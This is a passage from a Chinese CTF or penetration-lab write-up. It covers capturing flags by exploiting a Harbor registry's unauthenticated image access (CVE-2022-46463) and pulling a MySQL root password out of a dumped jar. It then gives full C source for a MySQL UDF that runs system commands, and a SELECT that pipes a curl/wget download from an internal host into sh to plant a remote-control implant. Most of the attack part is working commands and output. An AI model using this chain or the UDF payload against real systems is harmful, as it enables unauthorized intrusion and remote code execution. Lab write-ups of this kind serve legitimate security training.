`id`\040int\040DEFAULT\040NULL,
\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
CREATE\040TABLE\040`flag04`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
INSERT\040INTO\040`flag`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
INSERT\040INTO\040`flag04`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
exit
```
解码即可

## 172.22.14.46-Harbor

fscan可以扫出来存在 Harbor 公开镜像仓库未授权访问

```bash
root@VM-8-5-ubuntu:~/tools/CVE-2022-46463_harbor# proxychains python3 harbor.py http://172.22.14.46
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.14.46:80  ...  OK
[*] API version used v2.0
[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.14.46:80  ...  OK
[+] project/projectadmin
[+] project/portal
[+] library/nginx
[+] library/redis
[+] harbor/secret
```

dump到本地
```bash
root@VM-8-5-ubuntu:~/tools/CVE-2022-46463_harbor# proxychains python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2
```

### flag5
```bash
root@VM-8-5-ubuntu:~/tools/CVE-2022-46463_harbor# cat ./caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt
flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
```

## 172.22.10.28-mysql_udf

刚才dump出来的公开镜像里还有个`project/projectadmin`，看名字拉一手

```bash
root@VM-8-5-ubuntu:~/tools/CVE-2022-46463_harbor# proxychains python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2
```
可以看到，里面有个jar包
```bash
root@VM-8-5-ubuntu:~/tools/CVE-2022-46463_harbor/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c# cat run.sh
#!/bin/bash
sleep 1

# start
java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar
/usr/bin/tail -f /dev/null
```
jar包反编译下能拿到mysql的密码
在SpringBoot 配置文件 `application.properties` 下

```java
spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&useUnicode=true&serverTimezone=UTC
spring.datasource.username=root
spring.datasource.password=My3q1i4oZkJm3
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
```
同时**172.22.10.28**开放了3306，可以连上看一手，这里我的MDUT一样用不了，猜测还是因为代理的缘故，手动搞吧，以前出靶机**XIYI**的时候存过一个，udf提权条件可以看XIYI的WP


```c
udf.c

#include <stdio.h>

#include <stdlib.h>



enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};



typedef struct st_udf_args {

        unsigned int            arg_count;      // number of arguments

        enum Item_result        *arg_type;      // pointer to item_result

        char                    **args;         // pointer to arguments

        unsigned long           *lengths;       // length of string args

        char                    *maybe_null;    // 1 for maybe_null args

} UDF_ARGS;



typedef struct st_udf_init {

        char                    maybe_null;     // 1 if func can return NULL

        unsigned int            decimals;       // for real functions

        unsigned long           max_length;     // for string functions

        char                    *ptr;           // free ptr for func data

        char                    const_item;     // 0 if result is constant

} UDF_INIT;



int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)

{

        if (args->arg_count != 1)

                return(0);



        system(args->args[0]);



        return(0);

}



char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)

{

        return(0);

}
```
这个没回显，不过我是上线vshell的，也够用了

```bash
root@VM-8-5-ubuntu:/tmp/test# gcc -g -shared -o udf.so udf.c -lc
root@VM-8-5-ubuntu:/tmp/test# xxd -p udf.so | tr -d '\n' > udf.hex

root@VM-8-5-ubuntu:/tmp/test# proxychains4 mysql -h 172.22.10.28 -uroot -pMy3q1i4oZkJm3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
mysql: [Warning] Using a password on the command line interface can be insecure.
[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.10.28:3306  ...  OK
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 163
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```


mysql连上去插进去，我这个插过了忽略小细节
```mysql

mysql>select unhex('7f454c4602010100000000000000000003003e00............') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';

mysql> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so';
ERROR 1125 (HY000): Function 'do_system' already exists

mysql> SELECT * FROM mysql.func WHERE name='do_system';
+-----------+-----+-------------+----------+
| name      | ret | dl          | type     |
+-----------+-----+-------------+----------+
| do_system |   2 | mysqludf.so | function |
+-----------+-----+-------------+----------+
1 row in set (0.07 sec)

mysql> SELECT do_system('(curl -fsSL -m180 http://172.22.14.6:10003/slt||wget -T180 -q http://172.22.14.6:10003/slt)|sh');

```
上线下vshell即可

### flag6

```bash
mysql@project:/tmp$ cat /f2ag06_Aq1aqx.txt 
flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}
```




# 齐聚一堂



<img width="2140" height="362" alt="Image" src="https://github.com/user-attachments/assets/3b1e8e3d-bb77-4440-aaba-d21de44a79b7" />












